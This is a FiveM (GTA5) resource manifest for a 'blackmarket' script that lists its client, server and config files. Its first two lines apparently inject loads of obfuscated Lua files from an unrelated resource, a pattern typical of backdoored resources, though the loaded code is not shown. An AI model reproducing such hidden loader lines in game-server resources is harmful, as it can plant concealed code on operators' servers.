shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

 
fx_version 'cerulean'
game 'gta5'
description 'elused-blackmarket'
Author 'InDream#9996'
version '1.0.0'
client_scripts {
	'client/client.lua',
}
server_scripts {
	'server/server.lua',
}
shared_script {
	'config.lua'
}
lua54 'yes'

escrow_ignore {
    'config.lua'
  }
